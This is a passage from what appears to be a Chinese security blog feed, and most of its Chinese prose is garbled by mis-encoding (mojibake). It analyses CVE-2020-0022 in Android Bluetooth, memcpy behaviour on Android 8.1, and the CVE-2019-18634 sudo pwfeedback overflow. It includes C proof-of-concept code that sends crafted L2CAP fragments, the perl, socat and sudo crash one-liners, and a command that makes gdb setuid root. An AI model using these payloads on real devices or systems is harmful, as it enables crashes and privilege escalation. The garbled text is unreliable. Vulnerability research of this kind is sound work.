è¡Œè¿›è¡Œæ‹·è´çš„æ—¶å€™ï¼Œpacket-&gt;len - packet-&gt;offset å°±å¯èƒ½ä¸ºä¸€ä¸ªè´Ÿæ•°ï¼Œå½“size ä¸ºè´Ÿæ•°ï¼Œç”±äºmemcpy çš„å‚æ•°æ˜¯æ— ç¬¦å·çš„ï¼Œæ‰€ä»¥ä¼šè¢«å¼ºåˆ¶è½¬æ¢ä¸ºä¸€ä¸ªå¤§æ•°ï¼Œç„¶åé€ æˆå †æº¢å‡ºã€‚</p><h2 id="PoC-æ„å»º"><a href="#PoC-æ„å»º" class="headerlink" title="PoC æ„å»º"></a>PoC æ„å»º</h2><p>PoC é“¾æ¥å¯ä»¥çœ‹ç€ï¼š <a href="https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef">https://gist.github.com/leommxj/c9ba42e54faa9629cff5db3b4daeccef</a></p><ol><li>æˆ‘ä»¬è¦æ„å»º  packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; ä¸ºä¸€ä¸ªå°æ•°ï¼Œæˆ–è€…å¹²è„†å°±æ˜¯ä¸€ä¸ªè´Ÿæ•°</li></ol><p>é€šè¿‡å‰æ–‡åˆ†æï¼Œæˆ‘ä»¬çŸ¥é“ packet-&gt;len  ç­‰äº partial_packet-&gt;len - partial_packet-&gt;offset ç›¸å‡ï¼Œpartial_packet-&gt;len ä¸º full_length  -&gt; </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>partial_packet-&gt;offset  ä¸ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">partial_packet-&gt;offset = packet-&gt;len;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nCreating a HCI BLE connection...\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nPrepare to send packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> datalen = <span class="number">30</span>;</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_l2cap_len = htobs(datalen + <span class="number">4</span>);</span><br><span class="line"><span class="keyword">uint16_t</span> _bs_cid = htobs(<span class="number">0x0001</span>);</span><br><span class="line"><span class="keyword">uint8_t</span> packet[<span class="number">4</span> + L2CAP_CMD_HDR_SIZE + datalen + <span class="number">11</span>];</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">0</span>],&amp;_bs_l2cap_len,<span class="number">2</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(&amp;packet[<span class="number">2</span>],&amp;_bs_cid,<span class="number">2</span>);</span><br><span class="line">l2cap_cmd_hdr* cmd = (l2cap_cmd_hdr*) (packet+ <span class="number">4</span>);</span><br><span class="line">cmd-&gt;code = L2CAP_ECHO_REQ;</span><br><span class="line">cmd-&gt;ident = <span class="number">0x01</span>;</span><br><span class="line">cmd-&gt;len = htobs(datalen);</span><br><span class="line"><span class="built_in">memset</span>(&amp;packet[<span class="number">8</span>], <span class="number">0x99</span>, datalen+<span class="number">11</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending first packet\n&quot;</span>);</span><br><span class="line"><span class="keyword">int</span> i =<span class="number">0</span> ;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">8</span> + <span class="number">4</span> ,<span class="number">0x0</span>, <span class="number">8</span> + <span class="number">4</span> ); </span><br><span class="line">i+=<span class="number">4</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending second packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>);</span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nSending third packet\n&quot;</span>);</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">12</span>,<span class="number">0x1</span>,<span class="number">12</span>); </span><br><span class="line">i+=<span class="number">12</span>;</span><br><span class="line">hci_send_acl_data(hci_socket, hci_handle, &amp;packet[i] , <span class="number">11</span>,<span class="number">0x1</span>,<span class="number">11</span>); </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing HCI socket...\n&quot;</span>);</span><br><span class="line">close(hci_socket);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\nClosing l2cap socket...\n&quot;</span>);</span><br><span class="line">close(l2_sock);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>é¦–å…ˆï¼Œæ•´ä¸ªl2cap é•¿åº¦ä¸º ï¼š datalen + header å³ 30 + 4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">full_length =</span><br><span class="line">          l2cap_length + L2CAP_HEADER_SIZE + HCI_ACL_PREAMBLE_SIZE;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆæ­¤æ—¶ full_length å°±ç­‰äº  34 + 4 + 4 ç­‰äº 42</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">packet-&gt;offset &#x3D; HCI_ACL_PREAMBLE_SIZE;</span><br><span class="line">uint16_t projected_offset &#x3D;</span><br><span class="line">    partial_packet-&gt;offset + (packet-&gt;len - HCI_ACL_PREAMBLE_SIZE);</span><br><span class="line">if (projected_offset &gt;</span><br><span class="line">    partial_packet-&gt;len) &#123;  &#x2F;&#x2F; len stores the expected length</span><br><span class="line">  LOG_WARN(LOG_TAG,</span><br><span class="line">           &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">           &quot;Truncating.&quot;,</span><br><span class="line">           __func__, partial_packet-&gt;len);</span><br><span class="line">  packet-&gt;len &#x3D; partial_packet-&gt;len - partial_packet-&gt;offset;</span><br><span class="line">  projected_offset &#x3D; partial_packet-&gt;len;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶ projected_offset = 36 + ï¼ˆ11 - 4ï¼‰</p><p>36 æ˜¯ç”± 12 + 12 + 12 å½“æœ€åä¸€ä¸ªåŒ…çš„æ—¶å€™ partial_packet-&gt;offset å°±ä¸º 36</p><p>é‚£ä¹ˆæ­¤æ—¶ projected_offset = 43</p><p>å½“ 42-43 çš„æ—¶å€™ä¸ºè´Ÿæ•° åˆ™  packet-&gt;len ç­‰äº -1</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><p><a href="https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw">https://mp.weixin.qq.com/s/MgttHkorVd5UrW1Cnlc5Xw</a></p><p><a href="https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf^!/">https://android.googlesource.com/platform/system/bt/+/3cb7149d8fed2d7d77ceaa95bf845224c4db3baf%5E%21/</a></p><p> <a href="https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets">https://stackoverflow.com/questions/60116790/sending-gap-acl-l2cap-data-packets</a></p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0022 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 8.1 ä¸Š memcpy ä¸€ç‚¹æœ‰è¶£çš„ä¸œè¥¿</title>
      <link href="Android-8.1-memcpy-func.html"/>
      <url>Android-8.1-memcpy-func.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è¿™å‡ å¤©ä¸€ç›´åœ¨çœ‹ CVE-2020-0022 çš„ä¸œè¥¿ï¼Œä¸æ¸…æ¥šçš„åŒå­¦å¯ä»¥å‚è€ƒï¼š</p><p><a href="https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/">https://insinuator.net/2020/02/critical-bluetooth-vulnerability-in-android-cve-2020-0022/</a></p><p>ä»£ç ä¸é•¿ï¼Œå…·ä½“é€»è¾‘æˆ‘å°±ä¸åœ¨è¿™é‡Œåˆ†æäº†ï¼Œæ€»è€Œè¨€ä¹‹é—®é¢˜å°±æ˜¯</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">diff --git a/hci/src/packet_fragmenter.cc b/hci/src/packet_fragmenter.cc</span><br><span class="line">index 5036ed5..143fc23 100644</span><br><span class="line"><span class="comment">--- a/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="comment">+++ b/hci/src/packet_fragmenter.cc</span></span><br><span class="line"><span class="meta">@@ -221,7 +221,8 @@</span></span><br><span class="line">                  &quot;%s got packet which would exceed expected length of %d. &quot;</span><br><span class="line">                  &quot;Truncating.&quot;,</span><br><span class="line">                  __func__, partial_packet-&gt;len);</span><br><span class="line"><span class="deletion">-        packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset;</span></span><br><span class="line"><span class="addition">+        packet-&gt;len =</span></span><br><span class="line"><span class="addition">+            (partial_packet-&gt;len - partial_packet-&gt;offset) + packet-&gt;offset;</span></span><br><span class="line">         projected_offset = partial_packet-&gt;len;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>å½“è®¡ç®— packet-&gt;len = partial_packet-&gt;len - partial_packet-&gt;offset; å€¼çš„æ—¶å€™ï¼Œå¯èƒ½è®¡ç®—å‡ºä¸€ä¸ªå°çš„æ•°ï¼Œæˆ–è€…å¹²è„†æ˜¯è´Ÿæ•°ï¼Œå¯¼è‡´åœ¨</p><p><a href="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593171-84e7f580-5063-11ea-8f65-b8d314131260.png" alt="image"></a></p><p>åé¢æ‹·è´çš„æ—¶å€™ï¼Œ æ‹·è´ä¸€ä¸ª è´Ÿæ•°é•¿åº¦çš„å€¼ï¼Œç”±äº memcpy å‚æ•°æ˜¯æ— ç¬¦å·çš„ï¼Œåˆ™å¯¼è‡´æ‹·è´ä¸€ä¸ªå¤§æ•°</p><h2 id="Android-8-1-memcpy-å¼•èµ·çš„ä¸€ä¸ªå°bug"><a href="#Android-8-1-memcpy-å¼•èµ·çš„ä¸€ä¸ªå°bug" class="headerlink" title="Android 8.1 memcpy å¼•èµ·çš„ä¸€ä¸ªå°bug"></a>Android 8.1 memcpy å¼•èµ·çš„ä¸€ä¸ªå°bug</h2><p>åœ¨æˆ‘å’Œ @<a href="https://github.com/leommxj">leommxj</a> æµ‹è¯•çš„è¿‡ç¨‹ä¸­ï¼Œé‡åˆ°ä¸€ä¸ªå‘ï¼Œå¤§è‡´å¦‚å›¾ï¼š</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200216022738.png"></a></p><p>X0 æ˜¯ dest ï¼ŒX1æ˜¯ srcï¼Œ X2æ˜¯ size ï¼Œæ­¤æ—¶çš„size æ˜æ˜æ˜¯ä¸ªè´Ÿæ•°ï¼Œè€Œä¸”ä¸‹æº¢åè‡³å°‘æ˜¯ä¸€ä¸ªå¾ˆå¤§çš„æ•°ï¼Œä½†æ˜¯ç¨‹åºå¹¶æ²¡æœ‰å´©æºƒã€‚</p><h3 id="å¼•èµ·-BUG-çš„åŸå› "><a href="#å¼•èµ·-BUG-çš„åŸå› " class="headerlink" title="å¼•èµ· BUG çš„åŸå› "></a>å¼•èµ· BUG çš„åŸå› </h3><p>çœŸçš„å„ç§çŒœæµ‹ä¸å¦‚çœ‹ä»£ç ï¼Œæ‰€ä»¥æˆ‘ä»¬æŠŠ libc.so æ‹¿å‡ºæ¥çœ‹äº†ä¸€ä¸‹</p><a href="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593437-49025f80-5066-11ea-89f0-ae9d78ba123f.png" alt="image" style="zoom:150%;" /></a><p>é‡ç‚¹åœ¨äºï¼š</p><p><a href="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593316-e5c3fd80-5064-11ea-9566-ab65710283b0.png" alt="image"></a></p><p>æ­¤æ—¶ X0 æ˜¯destï¼ŒDest å–ä½ä½èµ‹å€¼ç»™X9ï¼Œç„¶å </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ADD X2, X2 ,X9</span><br></pre></td></tr></table></figure><p>è€Œæ­¤æ—¶çš„ X2 æ˜¯ lenï¼Œå¯¼è‡´ä»–æ•´å‹ä¸Šæº¢å‡ºï¼Œå˜æˆä¸€ä¸ªå°çš„æ•°å­—ï¼Œä¾‹å¦‚ 0xa</p><p><a href="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593356-405d5980-5065-11ea-9ba9-f3b43e68bf9c.png" alt="image"></a></p><p>å½“è¿›å…¥ä¸‹å›¾é€»è¾‘æ—¶</p><a href="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" title="image" class="gallery-item"><img src="https://user-images.githubusercontent.com/18380453/74593369-6682f980-5065-11ea-9271-c425599f69f4.png" alt="image" style="zoom:50%;" /></a><p>æ­¤æ—¶ X2 ä¸º 0xAï¼Œè¿›è¡Œä¸‹é¢çš„æŒ‡ä»¤çš„æ—¶å€™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SUBS            X2, X2, #0x90</span><br><span class="line">B.LS            loc_1C8A8</span><br></pre></td></tr></table></figure><p>ç”±äºæ­¤æ—¶ X2 ä¸º 0xA ï¼Œå°äº0x40ï¼Œæ‰€ä»¥ æ­¤æ—¶æ¡ä»¶ä¸º å°äº</p><p><strong>B. LS</strong> åˆ™è¡¨ç¤ºï¼Œå½“å°äºç­‰äºæ¡ä»¶æˆç«‹æ—¶å€™ï¼Œä¸ºçœŸï¼Œåˆ™è·³è½¬åˆ°  loc_1C8A8 å¤„ä»£ç ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">loc_1C8A8</span><br><span class="line">LDP             X1, X2, [X4,#-0x40]</span><br><span class="line">STP             X6, X7, [X3,#0x10]</span><br><span class="line">LDP             X6, X7, [X4,#-0x30]</span><br><span class="line">STP             X8, X9, [X3,#0x20]</span><br><span class="line">LDP             X8, X9, [X4,#-0x20]</span><br><span class="line">STP             X10, X11, [X3,#0x30]</span><br><span class="line">LDP             X10, X11, [X4,#-0x10]</span><br><span class="line">STP             X12, X13, [X3,#0x40]</span><br><span class="line">STP             X1, X2, [X5,#-0x40]</span><br><span class="line">STP             X6, X7, [X5,#-0x30]</span><br><span class="line">STP             X8, X9, [X5,#-0x20]</span><br><span class="line">STP             X10, X11, [X5,#-0x10]</span><br><span class="line">RET</span><br><span class="line">; &#125; &#x2F;&#x2F; starts at 1C770</span><br></pre></td></tr></table></figure><p>ä¹‹åçš„ä»£ç é€»è¾‘ç›´æ¥å°±æ˜¯ RET ï¼Œå¯¼è‡´ å¹¶æ²¡æœ‰æ‹·è´è¿‡é•¿çš„å†…å­˜ï¼Œå¯¼è‡´ crashã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´åˆ†æ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android8.1 </tag>
            
            <tag> memcpy </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2019-18634 åˆ†æ</title>
      <link href="CVE-2019-18634-analysis.html"/>
      <url>CVE-2019-18634-analysis.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><blockquote><p>Sudoâ€™s <em>pwfeedback</em> option can be used to provide visual feedback when the user is inputting their password. For each key press, an asterisk is printed. This option was added in response to user confusion over how the standard <code>Password:</code> prompt disables the echoing of key presses. While <em>pwfeedback</em> is not enabled by default in the upstream version of sudo, some systems, such as Linux Mint and Elementary OS, do enable it in their default sudoers files.</p><p>Due to a bug, when the <em>pwfeedback</em> option is enabled in the sudoers file, a user may be able to trigger a stack-based buffer overflow. This bug can be triggered even by users not listed in the sudoers file. There is <strong>no</strong> impact unless <em>pwfeedback</em> has been enabled.</p></blockquote><p>å¯ä»¥çŸ¥é“çš„ä¿¡æ¯æ˜¯ï¼š</p><ol><li>æ¼æ´å­˜åœ¨çš„æƒ…å½¢æ—¶åœ¨å¼€å¯ <strong>pwfeedback</strong> çš„å‰æä¸‹</li></ol><p>å¼€å¯æ–¹æ³• <code>echo Defaults pwfeedback &gt;&gt; /etc/sudoers</code><br>2. å½±å“ç‰ˆæœ¬  1.8.26-1.8.30<br>3. CVE ä¸Šå†™çš„ stack-based buffer overflow æ˜¯æœ‰è¯¯çš„ï¼Œæˆ‘ä»¬åé¢ä¼šæåˆ°</p><h2 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h2><p>åœ¨ openwall å’Œ sudo å®˜ç½‘ä¸Šéƒ½èƒ½çœ‹åˆ°è¿æ¥åœ¨ä¸‹é¢</p><p><a href="https://www.openwall.com/lists/oss-security/2020/02/05/2">CVE-2019-18634: buffer overflow in sudo when pwfeedback is enabled</a></p><p><a href="https://www.sudo.ws/alerts/pwfeedback.html">Buffer overflow when pwfeedback is set in sudoers </a></p><p><strong>PoC 1</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ socat pty,link&#x3D;&#x2F;tmp&#x2F;pty,waitslave exec:&quot;perl -e &#39;print((\&quot;A\&quot; x 100 . chr(0x15)) x 50)&#39;&quot; &amp;</span><br><span class="line"> $ sudo -S -k id &lt; &#x2F;tmp&#x2F;pty</span><br><span class="line"> Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p><strong>PoC2</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ perl -e &#39;print((&quot;A&quot; x 100 . chr(0)) x 50)&#39; | sudo -S -k id</span><br><span class="line">Password: Segmentation fault (core dumped)</span><br></pre></td></tr></table></figure><p>PoC1 æ˜¯é€šè¿‡ pty ç¨‹åºä¼  payload  ï¼ŒPoC2 æ˜¯é€šè¿‡ç»ˆç«¯ï¼Œå¦å¤–å¯ä»¥çœ‹åˆ° ä¸€ä¸ªç»“å°¾ä¸º <code>chr(0x15)</code> ä¸€ä¸ªç»“å°¾æ˜¯ <code>chr(0)</code>, è¿™æ˜¯æ ¹æ®ä¸åŒçš„ä¼ å…¥æ–¹å¼åŒºåˆ†çš„ã€‚</p><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><h3 id="å¯»æ‰¾æ¼æ´ç‚¹"><a href="#å¯»æ‰¾æ¼æ´ç‚¹" class="headerlink" title="å¯»æ‰¾æ¼æ´ç‚¹"></a>å¯»æ‰¾æ¼æ´ç‚¹</h3><p>æˆ‘çš„ç¯å¢ƒæ˜¯ ubuntu18.04 ç„¶åæˆ‘ç¼–è¯‘äº†ä¸€ä»½ sudo 1.8.21p2 çš„æºç ï¼Œæ–¹ä¾¿ç”¨æ¥è°ƒè¯•</p><p>ä¸ºäº†æ–¹ä¾¿ï¼Œæˆ‘ä¸€å¼€å§‹ç”¨çš„æ˜¯ PoC2ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">swing@ubuntu:~/Desktop/sudo/sudo-1.8.21p2/src/.libs$ gdb -q ./sudo</span><br><span class="line">Reading symbols from ./sudo...done.</span><br><span class="line">gdb-peda$ r -S id &lt; /tmp/poc2</span><br><span class="line">Starting program: /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo -S id &lt; /tmp/poc2</span><br><span class="line">sudo: effective uid is not 0, is /home/swing/Desktop/sudo/sudo-1.8.21p2/src/.libs/sudo on a file system with the <span class="string">&#x27;nosuid&#x27;</span> option <span class="built_in">set</span> or an NFS file system without root privileges?</span><br><span class="line">[Inferior 1 (process 14799) exited with code 01]</span><br></pre></td></tr></table></figure><p>ç¬¬ä¸€æ¬¡æŒ‚è½½ gdb çš„æ—¶å€™ä¼šå‘ç° æƒé™ä¸å¤Ÿï¼Œä½†æ˜¯å¦‚æœæƒé™æ˜¯ root sudoåˆå¤±å»äº†æ„ä¹‰ï¼Œæ‰€ä»¥æˆ‘ç»™ gdb æŒ‚ä¸Šäº†å’Œ sudo ä¸€æ ·çš„æƒé™</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown root:root /usr/bin/gdb &amp;&amp; chmod 4755 /usr/bin/gdb</span><br></pre></td></tr></table></figure><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191157.png"></a></p><p>ç„¶ååœ¨è°ƒè¯•ï¼Œå°±åŸºæœ¬ç¡®å®šäº†ä¸»è¦æ¼æ´çš„å­˜åœ¨ï¼Œåœ¨ tgetpass.c:178 getlnå‡½æ•°é‡Œ</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (timeout &gt; <span class="number">0</span>)</span><br><span class="line">alarm(timeout);</span><br><span class="line">   pass = getln(input, buf, <span class="keyword">sizeof</span>(buf), ISSET(flags, TGP_MASK));</span><br><span class="line">   alarm(<span class="number">0</span>);</span><br><span class="line">   save_errno = errno;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (neednl || pass == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (write(output, <span class="string">&quot;\n&quot;</span>, <span class="number">1</span>) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">goto</span> restore;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸”, ç”±äº buf æ˜¯static const ä½äºbssä¸Šï¼Œæ‰€ä»¥å¹¶ä¸æ˜¯ ä»€ä¹ˆæ ˆæº¢å‡ºï¼Œè€Œæ˜¯ bss æº¢å‡ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *</span><br><span class="line">tgetpass(<span class="keyword">const</span> <span class="keyword">char</span> *prompt, <span class="keyword">int</span> timeout, <span class="keyword">int</span> flags,</span><br><span class="line">    struct sudo_conv_callback *callback)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">sa</span>, <span class="title">savealrm</span>, <span class="title">saveint</span>, <span class="title">savehup</span>, <span class="title">savequit</span>, <span class="title">saveterm</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sigaction</span> <span class="title">savetstp</span>, <span class="title">savettin</span>, <span class="title">savettou</span>;</span></span><br><span class="line">    <span class="keyword">char</span> *pass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> *askpass;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> buf[SUDO_CONV_REPL_MAX + <span class="number">1</span>];</span><br><span class="line">    <span class="keyword">int</span> i, input, output, save_errno, neednl = <span class="number">0</span>, need_restart;</span><br><span class="line">    debug_decl(tgetpass, SUDO_DEBUG_CONV)</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªæ—¶å€™ï¼Œå¦‚æœæˆ‘ä»¬ç”¨ ida çœ‹ï¼Œèƒ½çœ‹åˆ°ä»–æ€»å…±è¦†ç›–äº†å“ªäº›å˜é‡</p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/20200207191603.png" style="zoom:50%;" /></a><h2 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h2><p>æˆ‘ä»¬æ‰¾åˆ°äº†ä¸€äº›èƒ½è¦†ç›–çš„å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ç´§æ¥ç€è¦æ‰¾åˆ°å“ªäº›æ˜¯å¯åˆ©ç”¨çš„, ä¸­é—´ user_details è¿™ä¸ªç»“æ„ä½“çš„å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ p user_details</span><br><span class="line">$2 &#x3D; &#123;</span><br><span class="line">  pid &#x3D; 0x41414141,</span><br><span class="line">  ppid &#x3D; 0x41414141,</span><br><span class="line">  pgid &#x3D; 0x41414141,</span><br><span class="line">  tcpgid &#x3D; 0x41414141,</span><br><span class="line">  sid &#x3D; 0x41414141,</span><br><span class="line">  uid &#x3D; 0x41414141,</span><br><span class="line">  euid 